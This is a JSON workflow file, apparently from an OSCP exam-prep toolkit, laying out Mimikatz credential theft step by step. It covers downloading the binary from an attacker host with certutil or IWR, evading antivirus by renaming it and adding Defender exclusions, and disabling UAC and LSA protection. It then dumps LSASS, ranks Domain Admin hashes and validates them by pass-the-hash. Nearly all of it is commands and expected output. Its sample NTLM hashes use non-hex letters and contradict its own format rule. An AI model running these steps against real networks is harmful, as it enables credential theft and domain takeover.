{
  "id": "mimikatz-operational-workflow",
  "name": "Mimikatz Complete Operational Workflow",
  "description": "Complete operational guide for mimikatz credential dumping from upload to credential extraction and validation.\n\nThis chain covers the ENTIRE mimikatz workflow for OSCP: upload binary, enable required privileges, dump credentials, parse output, extract high-value credentials, validate with Pass-the-Hash, and troubleshoot common failures. Focus on OPERATIONAL usage, not theory.\n\nCRITICAL PREREQUISITE: 'privilege::debug' is MANDATORY before ANY sekurlsa commands. Even local administrators don't automatically have SeDebugPrivilege ENABLED. Without this step, mimikatz returns 'ERROR 0x00000005 Access Denied'. This is the #1 mimikatz failure in OSCP exams.\n\nWHY THIS MATTERS: Mimikatz is ESSENTIAL for OSCP credential harvesting. You need to know:\n- How to upload and execute mimikatz\n- WHAT privilege::debug does and WHY it's required\n- HOW to parse output for different credential types\n- WHICH credentials are high-value (Domain Admins, service accounts)\n- HOW to troubleshoot when it fails (AV blocks, access denied, empty output)\n\nSUCCESS RATE: Very high (90%+) IF you follow correct procedure. Most failures are due to:\n1. Forgetting privilege::debug (50% of failures)\n2. AV detection (30% of failures)\n3. No credentials cached (15% of failures)\n4. UAC/insufficient privileges (5% of failures)\n\nLESSON FROM CORP-DCSYNC WRITEUP: 'Mimikatz privilege::debug is MANDATORY before sekurlsa commands - even local admins don't automatically have SeDebugPrivilege enabled. Without this: ERROR 0x00000005 Access Denied.'",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - OSCP Track",
    "created": "2025-11-25",
    "updated": "2025-11-25",
    "tags": [
      "OSCP:HIGH",
      "WINDOWS",
      "POST_EXPLOITATION",
      "CREDENTIAL_ACCESS",
      "MIMIKATZ",
      "LSASS",
      "PASS_THE_HASH"
    ],
    "category": "post-exploitation",
    "platform": "windows",
    "references": [
      "https://github.com/gentilkiwi/mimikatz",
      "https://adsecurity.org/?page_id=1821",
      "https://attack.mitre.org/techniques/T1003/001/",
      "https://www.offensive-security.com/metasploit-unleashed/mimikatz/"
    ]
  },
  "difficulty": "beginner",
  "time_estimate": "10 minutes (2 min upload, 3 min execution, 5 min parsing/validation)",
  "oscp_relevant": true,
  "prerequisites": [
    "Local administrator access on target Windows system",
    "Ability to upload files to target (SMB, HTTP, Evil-WinRM, etc.)",
    "Mimikatz binary (mimikatz.exe) on attacker system",
    "Understanding of NTLM authentication and credential types",
    "Network access to validate credentials (crackmapexec or similar)"
  ],
  "notes": "This chain focuses on OPERATIONAL usage - getting mimikatz working in real scenarios with real failures. Not theory, but practice.\n\nCRITICAL SUCCESS FACTORS:\n1. privilege::debug BEFORE sekurlsa commands (mandatory, non-negotiable)\n2. Verify 'Privilege '20' OK' output (confirms SeDebugPrivilege enabled)\n3. Redirect output to file (mimikatz output too long for terminal)\n4. Parse for NTLM hashes (32 hex characters) - these work for Pass-the-Hash\n5. Identify session types: 'Service from 0' = persistent, 'Interactive from 2' = temporary\n\nCOMMON FAILURES AND SOLUTIONS:\n\n1. ERROR 0x00000005 Access Denied:\n   - Cause: Forgot privilege::debug OR not local admin\n   - Solution: Run privilege::debug first, or get SYSTEM shell (PSExec)\n\n2. AV Quarantines mimikatz.exe:\n   - Cause: Windows Defender or third-party AV detection\n   - Solution: Use obfuscated mimikatz, Invoke-Mimikatz (in-memory), or procdump+pypykatz\n\n3. Empty NTLM Fields:\n   - Cause: WDigest disabled (Windows 8.1+ default)\n   - Solution: Use sekurlsa::tickets for Kerberos tickets, or enable WDigest (reg add)\n\n4. No Credentials Cached:\n   - Cause: System recently rebooted, no user logins yet\n   - Solution: Wait for user logins, target different system, check registry for cached creds\n\n5. Privilege '20' KO (failed):\n   - Cause: UAC blocking, not local admin, or restricted token\n   - Solution: Get SYSTEM shell, disable UAC, or use alternative method\n\nALTERNATIVE METHODS (If mimikatz fails):\n- pypykatz: Python implementation (lsadump.py)\n- Invoke-Mimikatz: PowerShell in-memory (no disk write)\n- procdump + offline parsing: procdump -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp\n- Task Manager: Dump LSASS process \u2192 transfer .dmp \u2192 parse locally\n- Comsvcs.dll: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> C:\\temp\\lsass.dmp full\n\nOUTPUT PARSING GUIDE:\n\nCredential Types:\n- NTLM hash: 32 hex chars (a-f0-9) - USE THIS for Pass-the-Hash\n- LM hash: 32 hex chars (usually aad3b435... = empty) - ignore this\n- SHA1: 40 hex chars - not useful for PTH\n- Plaintext: Rare but gold when found - direct password\n- Kerberos tickets: .kirbi files - use for pass-the-ticket\n\nSession Types:\n- 'Service from 0': Cached until reboot (GOLDMINE - check these first)\n- 'Interactive from 2': Current logged-in user (may log out soon)\n- 'RemoteInteractive from 10': RDP session (similar to interactive)\n- 'NetworkCleartext from 8': Network logon with cleartext (rare)\n\nTIME ESTIMATES FOR OSCP:\n- Upload mimikatz: 1 minute\n- Enable privilege::debug: 30 seconds\n- Dump credentials: 2 minutes (depends on system memory)\n- Parse output: 2 minutes\n- Extract NTLM hashes: 1 minute\n- Validate with crackmapexec: 3 minutes\n- TOTAL: 10 minutes from upload to validated credentials\n\nEXAM TIPS:\n- Always redirect output to file (too long for screen buffer)\n- Check service sessions FIRST (more persistent)\n- Domain Admins may use alternative names (admin, svc_admin, etc.)\n- Validate ALL extracted hashes (some may be stale)\n- Document credentials immediately (easy to lose track)",
  "steps": [
    {
      "id": "upload-mimikatz",
      "name": "Upload Mimikatz Binary to Target System",
      "objective": "Transfer mimikatz.exe to writable directory on target Windows system",
      "description": "Upload mimikatz binary to target system using available transfer method. Choose writable directory that won't trigger AV.\n\nTransfer Methods (Priority Order):\n\n1. Evil-WinRM Upload (Easiest, built-in):\n   - From Evil-WinRM session: cd C:\\\\temp\n   - Upload: upload /path/to/mimikatz.exe\n   - Verify: dir mimikatz.exe (should show ~1.2 MB)\n\n2. SMB Copy (Fast, requires SMB server):\n   - Start SMB server: impacket-smbserver share /path/to/mimikatz -smb2support\n   - From target: copy \\\\\\\\<ATTACKER_IP>\\\\share\\\\mimikatz.exe C:\\\\temp\\\\\n   - Verify: dir C:\\\\temp\\\\mimikatz.exe\n\n3. PowerShell Download (Requires HTTP server):\n   - Start HTTP server: python3 -m http.server 80\n   - From target: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\\\temp\\\\mimikatz.exe\n   - Verify: Get-FileHash C:\\\\temp\\\\mimikatz.exe\n\n4. Certutil Download (Alternative):\n   - Start HTTP server: python3 -m http.server 80\n   - From target: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\\\\temp\\\\mimikatz.exe\n   - Verify: certutil -hashfile C:\\\\temp\\\\mimikatz.exe MD5\n\nWritable Directories (Priority Order):\n1. C:\\\\temp (may not exist - create with: mkdir C:\\\\temp)\n2. C:\\\\Users\\\\Public\n3. C:\\\\Windows\\\\temp (requires higher privileges)\n4. C:\\\\Users\\\\<USERNAME>\\\\AppData\\\\Local\\\\Temp\n5. C:\\\\ProgramData\n\nAntivirus Evasion:\n- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)\n- Rename binary: mv mimikatz.exe windowsupdate.exe\n- Add to exclusions: Add-MpPreference -ExclusionPath C:\\\\temp (requires admin)\n- Use alternative: pypykatz (Python, less detected)\n- In-memory execution: Invoke-Mimikatz (PowerShell, no disk write)\n\nVerification:\n1. File exists: dir C:\\\\temp\\\\mimikatz.exe\n2. Correct size: ~1.2 MB (1,355,776 bytes for v2.2.0)\n3. File hash matches: Compare with known good hash\n4. Test execution: .\\\\mimikatz.exe \"exit\" (should run without error)\n5. No AV alert: Check Windows Defender quarantine (Get-MpThreatDetection)\n\nTroubleshooting:\n- AV deletes immediately: Disable Defender OR use obfuscated version OR use in-memory\n- Upload fails: Check network connectivity, try alternative method\n- No writable directory: Create C:\\\\temp or use %TEMP% environment variable\n- File corrupted: Verify transfer (compare file size/hash), re-upload\n- Permission denied: Verify local admin with: whoami /groups | findstr Admin",
      "command_ref": "evil-winrm-upload-file",
      "evidence": [
        "Mimikatz.exe present in target directory",
        "File size verified (~1.2 MB)",
        "Test execution successful (mimikatz runs)",
        "No AV alerts or quarantine"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Mimikatz binary uploaded successfully",
        "File size correct (~1.2 MB)",
        "Binary executes without errors (test run)",
        "No AV detection or deletion"
      ],
      "failure_conditions": [
        "AV deletes file: Use obfuscated version or Invoke-Mimikatz",
        "Upload fails: Try alternative transfer method",
        "No writable directory: Create C:\\\\temp or use %TEMP%",
        "Permission denied: Verify local admin access"
      ],
      "next_steps": [
        "enable-sedbugprivilege"
      ]
    },
    {
      "id": "enable-sedbugprivilege",
      "name": "Enable SeDebugPrivilege with privilege::debug",
      "objective": "Enable SeDebugPrivilege token required for LSASS memory access - MANDATORY prerequisite",
      "description": "Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This step is MANDATORY and MUST come before any sekurlsa commands.\n\nCommand Execution:\n```\ncd C:\\\\temp\n.\\\\mimikatz.exe \"privilege::debug\" \"exit\"\n```\n\nExpected Output (SUCCESS):\n```\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\\\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\\\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # exit\nBye!\n```\n\nKEY INDICATORS OF SUCCESS:\n- \"Privilege '20' OK\" message\n- No error messages\n- Exit cleanly\n\nExpected Output (FAILURE):\n```\nmimikatz # privilege::debug\nPrivilege '20' KO\nERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061\n```\n\nThis indicates:\n- Not running as local administrator, OR\n- UAC is blocking privilege elevation, OR\n- SeDebugPrivilege not available in token\n\nWHY THIS IS MANDATORY:\nEven local administrators have SeDebugPrivilege in their token, but it's DISABLED by default. Mimikatz 'privilege::debug' ENABLES it. Without enabled SeDebugPrivilege:\n- Cannot read LSASS process memory\n- sekurlsa commands return ERROR 0x00000005 (Access Denied)\n- Credential dump fails completely\n\nTechnical Details:\nSeDebugPrivilege (Privilege ID 20) allows:\n- Reading memory of any process (including protected processes)\n- Bypassing normal security checks\n- Required for LSASS memory dump (LSASS is protected process)\n\nVerification Methods:\n\n1. Mimikatz output (primary):\n   - \"Privilege '20' OK\" = Success\n   - \"Privilege '20' KO\" = Failure\n\n2. Windows command (secondary):\n   ```\n   whoami /priv | findstr SeDebugPrivilege\n   ```\n   Before: SeDebugPrivilege  Disabled\n   After mimikatz: SeDebugPrivilege  Enabled\n\n3. Test sekurlsa command:\n   ```\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n   ```\n   If privilege::debug worked: Credentials appear\n   If failed: ERROR 0x00000005\n\nTroubleshooting:\n\n1. \"Privilege '20' KO\":\n   - Verify local admin: whoami /groups | findstr \"S-1-5-32-544\"\n   - Get SYSTEM shell: psexec -s -i cmd.exe (from Sysinternals)\n   - Disable UAC: reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)\n\n2. UAC Blocking:\n   - Run from elevated command prompt (if RDP access)\n   - Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)\n   - Disable UAC temporarily\n\n3. Token Doesn't Have Privilege:\n   - User not in Administrators group (recheck access)\n   - Restricted token (some lateral movement methods create restricted shells)\n   - Use alternative access method (Evil-WinRM usually provides full token)\n\nAlternative Methods (if privilege::debug fails):\n- Use PSExec to get SYSTEM shell: impacket-psexec user@target (SYSTEM has SeDebugPrivilege by default)\n- Disable LSA protection: reg delete HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v RunAsPPL /f (requires reboot)\n- Use alternative tools: pypykatz (different implementation), procdump (uses different method)",
      "command_ref": "mimikatz-privilege-debug",
      "evidence": [
        "Mimikatz output showing 'Privilege '20' OK'",
        "whoami /priv showing SeDebugPrivilege Enabled",
        "No error messages about access denied"
      ],
      "dependencies": [
        "upload-mimikatz"
      ],
      "repeatable": false,
      "success_criteria": [
        "Mimikatz outputs 'Privilege '20' OK'",
        "No error messages or warnings",
        "whoami /priv confirms SeDebugPrivilege Enabled",
        "Ready to proceed with sekurlsa commands"
      ],
      "failure_conditions": [
        "Privilege '20' KO: Get SYSTEM shell or disable UAC",
        "Access denied: Verify local admin status",
        "Command not found: Check mimikatz path and spelling"
      ],
      "next_steps": [
        "dump-lsass-memory"
      ]
    },
    {
      "id": "dump-lsass-memory",
      "name": "Dump LSASS Credentials with sekurlsa::logonpasswords",
      "objective": "Extract all cached credentials from LSASS memory and save to file for analysis",
      "description": "Execute mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory. MUST redirect output to file (output too long for terminal).\n\nCommand Execution:\n```\ncd C:\\\\temp\n.\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > credentials.txt\n```\n\nCommand Breakdown:\n- privilege::debug: Enable SeDebugPrivilege (from step 2)\n- sekurlsa::logonpasswords: Dump all logon session credentials\n- exit: Close mimikatz cleanly\n- > credentials.txt: Redirect output to file (CRITICAL - output very long)\n\nExecution Time:\n- Small system (<4GB RAM): 2-3 seconds\n- Medium system (4-16GB RAM): 5-10 seconds\n- Large system (>16GB RAM): 10-30 seconds\n- Busy Domain Controller: 30-60 seconds\n\nExpected Output Structure (in credentials.txt):\n```\nAuthentication Id : 0 ; 12345678 (00000000:00bc614e)\nSession           : Service from 0\nUser Name         : administrator\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 11/24/2025 10:30:15 AM\nSID               : S-1-5-21-1234567890-1234567890-1234567890-500\n        msv :\n         [00000003] Primary\n         * Username : administrator\n         * Domain   : CORP\n         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n         * SHA1     : 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0\n        tspkg :\n        wdigest :\n         * Username : administrator\n         * Domain   : CORP\n         * Password : (null)  [OR plaintext password if WDigest enabled]\n        kerberos :\n         * Username : administrator\n         * Domain   : CORP.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\n[... repeats for each cached credential ...]\n```\n\nKey Fields to Extract:\n\n1. Session Type:\n   - \"Service from 0\": GOLDMINE - persists until reboot, check these FIRST\n   - \"Interactive from 2\": Current user logged in (may log out soon)\n   - \"RemoteInteractive from 10\": RDP session (similar to interactive)\n\n2. Username/Domain:\n   - Format: DOMAIN\\\\username\n   - Look for: administrator, domain admin accounts, svc_* service accounts\n\n3. NTLM Hash:\n   - 32 hexadecimal characters (0-9, a-f)\n   - This is what you need for Pass-the-Hash\n   - Located under \"msv :\" section\n\n4. Plaintext Password:\n   - Under \"wdigest :\" section\n   - Usually \"(null)\" on Windows 8.1+ (WDigest disabled by default)\n   - If present: GOLDMINE - use directly, no PTH needed\n\n5. Logon Server:\n   - Shows Domain Controller name\n   - Confirms domain account (not local)\n\nOutput Size:\n- Typical workstation: 50-200 lines\n- Server: 200-500 lines\n- Domain Controller: 500-2000+ lines\n\nTroubleshooting:\n\n1. ERROR 0x00000005 Access Denied:\n   - Cause: Forgot privilege::debug (step 2)\n   - Solution: Run command again with privilege::debug included\n\n2. Empty Output / No Credentials:\n   - Cause: System recently rebooted, no logins yet\n   - Solution: Wait for user logins, target different system\n\n3. Only Computer Accounts (HOSTNAME$):\n   - Cause: No user sessions cached\n   - Solution: Target different system, check servers\n\n4. Empty NTLM/Password Fields:\n   - Cause: WDigest disabled (Windows 8.1+ default)\n   - Solution: Extract Kerberos tickets instead (sekurlsa::tickets)\n\n5. LSASS Protected (ERROR):\n   - Cause: Credential Guard enabled, LSA protection\n   - Solution: Disable protection (reg delete), use alternative method\n\n6. Output Too Long for Terminal:\n   - Cause: Forgot to redirect to file\n   - Solution: Re-run with \"> credentials.txt\"\n\nAlternative Commands:\n\n1. Export to different format:\n   ```\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords /format:list\" \"exit\" > creds_list.txt\n   ```\n\n2. Dump specific authentication package:\n   ```\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::msv\" \"exit\"  # NTLM only\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" \"exit\"  # Plaintext only\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::kerberos\" \"exit\"  # Kerberos only\n   ```\n\n3. Export tickets:\n   ```\n   .\\\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"\n   ```",
      "command_ref": "mimikatz-sekurlsa-logonpasswords",
      "evidence": [
        "credentials.txt file created",
        "File contains mimikatz output with credentials",
        "No error messages about access denied",
        "At least 1-5 cached credentials found"
      ],
      "dependencies": [
        "enable-sedbugprivilege"
      ],
      "repeatable": true,
      "success_criteria": [
        "Command executes without errors",
        "Output redirected to file successfully",
        "File contains credential data (not just errors)",
        "NTLM hashes or plaintext passwords extracted"
      ],
      "failure_conditions": [
        "Access denied: Re-run with privilege::debug",
        "No credentials: System recently rebooted or no user logins",
        "Empty NTLM fields: Use sekurlsa::tickets for Kerberos",
        "LSASS protected: Disable protection or use alternative"
      ],
      "next_steps": [
        "parse-extract-credentials"
      ]
    },
    {
      "id": "parse-extract-credentials",
      "name": "Parse Output and Extract High-Value Credentials",
      "objective": "Parse mimikatz output to extract NTLM hashes and identify Domain Admin credentials",
      "description": "Parse the credentials.txt file to extract NTLM hashes, map to usernames, and identify high-value targets (Domain Admins, service accounts).\n\nParsing Process:\n\n1. Open credentials.txt:\n   ```\n   type C:\\\\temp\\\\credentials.txt | more\n   ```\n   OR download for local parsing:\n   ```\n   download C:\\\\temp\\\\credentials.txt  # From Evil-WinRM\n   ```\n\n2. Search for Key Patterns:\n   - \"Session           : Service from 0\" (PRIORITY - persistent sessions)\n   - \"* NTLM     :\" (followed by 32 hex characters)\n   - \"* Username :\" (extract username)\n   - \"* Domain   :\" (extract domain)\n\n3. Extract Credentials:\n   For each session, capture:\n   - Session Type\n   - Username\n   - Domain\n   - NTLM Hash (32 hex chars)\n   - Logon Server (confirms DC)\n\nManual Extraction Example:\nInput (credentials.txt):\n```\nAuthentication Id : 0 ; 123456\nSession           : Service from 0\nUser Name         : administrator\nDomain            : CORP\nLogon Server      : DC01\n        msv :\n         * Username : administrator\n         * Domain   : CORP\n         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n```\n\nExtracted Credential:\n```\nCORP\\\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nSession: Service from 0 (persistent)\nLogon Server: DC01\n```\n\nAutomated Parsing (PowerShell):\n```powershell\n$content = Get-Content C:\\\\temp\\\\credentials.txt\n$credentials = @()\n\nfor ($i = 0; $i -lt $content.Length; $i++) {\n    if ($content[$i] -match 'User Name\\\\s+:\\\\s+(.+)') {\n        $username = $Matches[1].Trim()\n    }\n    if ($content[$i] -match 'Domain\\\\s+:\\\\s+(.+)') {\n        $domain = $Matches[1].Trim()\n    }\n    if ($content[$i] -match '\\\\* NTLM\\\\s+:\\\\s+([a-f0-9]{32})') {\n        $ntlm = $Matches[1]\n        $credentials += \"$domain\\\\$username:$ntlm\"\n    }\n}\n\n$credentials | Out-File C:\\\\temp\\\\extracted_creds.txt\n```\n\nAutomated Parsing (Linux - grep):\n```bash\ngrep -A 10 \"Session\" credentials.txt | grep -E \"Session|Username|Domain|NTLM\" > parsed.txt\n```\n\nPrioritization Strategy:\n\n1. Identify Domain Admins:\n   ```\n   net group \"Domain Admins\" /domain\n   ```\n   Cross-reference extracted usernames with this list.\n\n2. Priority Order:\n   - Administrator (built-in DA, RID 500)\n   - Domain Admin group members\n   - Enterprise Admins\n   - Service accounts (svc_*, sql_*, backup_*)\n   - IT/helpdesk accounts (it_admin, helpdesk, etc.)\n   - Standard users (lowest priority)\n\n3. Session Type Priority:\n   - Service from 0 (HIGHEST - persists until reboot)\n   - Interactive from 2 (Medium - current user, may log out)\n   - RemoteInteractive from 10 (Medium - RDP session)\n   - Network sessions (Lowest - temporary)\n\nHash Format Validation:\n- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)\n- Valid example: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n- Invalid formats:\n  - 40 chars = SHA1 (can't use for PTH)\n  - 16 chars = partial hash (corrupted)\n  - Contains spaces/special chars = parsing error\n\nExpected Findings:\n- Typical workstation: 5-15 credentials\n- At least 1-2 Domain Admin accounts (if workstation active)\n- Computer accounts (HOSTNAME$) - ignore these\n- Local accounts (domain = hostname) - ignore, focus on DOMAIN\\\\user\n\nCreate Credential List:\n```\nHIGH PRIORITY (Domain Admins):\nCORP\\\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nCORP\\\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1\n\nMEDIUM PRIORITY (Service Accounts):\nCORP\\\\svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2\nCORP\\\\sql_service:d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3\n\nLOW PRIORITY (Standard Users):\nCORP\\\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4\n```\n\nTroubleshooting:\n- No NTLM hashes: Check if WDigest disabled, extract Kerberos tickets instead\n- Hash extraction fails: Verify format (32 hex chars), check for whitespace\n- Can't determine DA membership: Run 'net group \"Domain Admins\" /domain' from target\n- Duplicate entries: Same user may appear multiple times (different sessions), use most recent",
      "command_ref": null,
      "evidence": [
        "Parsed credential list in DOMAIN\\\\user:hash format",
        "Domain Admin accounts identified",
        "Hash format validated (32 hex chars)",
        "Priority ranking assigned"
      ],
      "dependencies": [
        "dump-lsass-memory"
      ],
      "repeatable": true,
      "success_criteria": [
        "Extracted at least 3-5 NTLM hashes",
        "Hashes validated as correct format",
        "Mapped usernames to domains",
        "Identified at least 1 high-value account"
      ],
      "failure_conditions": [
        "No hashes extracted: Check if WDigest disabled, use Kerberos tickets",
        "Hash format invalid: Re-check extraction logic",
        "Can't identify DAs: Run net group command to get DA list"
      ],
      "next_steps": [
        "validate-credentials"
      ]
    },
    {
      "id": "validate-credentials",
      "name": "Validate Credentials with Pass-the-Hash",
      "objective": "Test extracted NTLM hashes to confirm they work and identify Domain Admin access",
      "description": "Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm which accounts have Domain Admin privileges.\n\nValidation Command:\n```\ncrackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>\n```\n\nExample:\n```\ncrackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP\n```\n\nExpected Output (Domain Admin):\n```\nSMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True)\nSMB  10.10.10.10  445  DC01  [+] CORP\\\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)\n```\n\nKey Indicators:\n- [+] = Authentication successful\n- (Pwn3d!) = Domain Admin privileges (can write to C$ on DC)\n- [name:DC01] = Domain Controller identification\n\nExpected Output (Valid User, Not DA):\n```\nSMB  10.10.10.10  445  DC01  [+] CORP\\\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4\n```\n\nNote: No \"Pwn3d!\" = Valid credentials but NOT Domain Admin. Can still use for lateral movement.\n\nExpected Output (Failed):\n```\nSMB  10.10.10.10  445  DC01  [-] CORP\\\\baduser:badhash STATUS_LOGON_FAILURE\n```\n\nBatch Validation (Multiple Credentials):\n\nCreate credential file (creds.txt):\n```\nadministrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nsvc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1\nsvc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2\njohn:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4\n```\n\nBatch test script:\n```bash\n#!/bin/bash\nDC=\"10.10.10.10\"\nDOMAIN=\"CORP\"\n\nwhile IFS=':' read -r user hash; do\n    echo \"[*] Testing $user...\"\n    crackmapexec smb $DC -u $user -H $hash -d $DOMAIN\n    echo \"\"\ndone < creds.txt\n```\n\nValidation Results Documentation:\n```\nDOMAIN ADMINS (Pwn3d!):\n- CORP\\\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 \u2713\n- CORP\\\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1 \u2713\n\nVALID USERS (No Pwn3d):\n- CORP\\\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4 \u2713\n\nFAILED:\n- CORP\\\\disabled_account:... \u2717 (STATUS_LOGON_FAILURE)\n```\n\nFind Domain Controller:\nIf DC IP unknown:\n1. From compromised system:\n   ```\n   nltest /dclist:CORP\n   ```\n2. DNS query:\n   ```\n   nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL\n   ```\n3. Port scan:\n   ```\n   nmap -p 88,389,636,445 10.10.10.0/24\n   ```\n   Look for systems with Kerberos (88), LDAP (389), SMB (445)\n\nAlternative Validation Methods:\n\n1. Evil-WinRM PTH:\n   ```\n   evil-winrm -i <DC_IP> -u administrator -H <hash>\n   ```\n   If connects: Valid credentials\n   If DA: Can access C:\\\\Users\\\\Administrator\n\n2. Impacket PSExec:\n   ```\n   impacket-psexec -hashes :<hash> CORP/administrator@<DC_IP>\n   ```\n   If gets shell: Valid DA credentials\n\n3. SMB Enumeration:\n   ```\n   smbclient //DC01/C$ -U administrator --pw-nt-hash <hash>\n   ```\n   If lists files: Valid DA credentials\n\nTroubleshooting:\n- Connection timeout: Check network routing, firewall, DC online\n- STATUS_LOGON_FAILURE: Hash incorrect, account disabled, or wrong domain\n- [+] but no Pwn3d: Valid user but NOT Domain Admin, can use for lateral movement\n- Account lockout: Test 1 credential at a time, wait between attempts\n- Clock skew: Sync time with DC (ntpdate <DC_IP>)\n\nNext Steps After Validation:\n1. Domain Admin found: Proceed to DC access and flag retrieval\n2. Valid users only: Use for lateral movement to more systems\n3. All failed: Re-dump credentials, check for stale hashes",
      "command_ref": "crackmapexec-smb-pth",
      "evidence": [
        "Crackmapexec output showing validation results",
        "Pwn3d indicator for Domain Admin accounts",
        "List of working credentials with privilege levels",
        "DC hostname and IP confirmed"
      ],
      "dependencies": [
        "parse-extract-credentials"
      ],
      "repeatable": true,
      "success_criteria": [
        "At least 1 credential validates successfully",
        "Identified Domain Admin accounts (Pwn3d!)",
        "DC accessible and responding",
        "Working credentials documented"
      ],
      "failure_conditions": [
        "All credentials fail: Hashes may be stale, check for account status",
        "No Pwn3d: Valid users but not DAs, continue lateral movement",
        "DC unreachable: Check network routing, try alternative DC",
        "Account lockout: Wait 30 minutes, resume testing"
      ],
      "next_steps": []
    }
  ]
}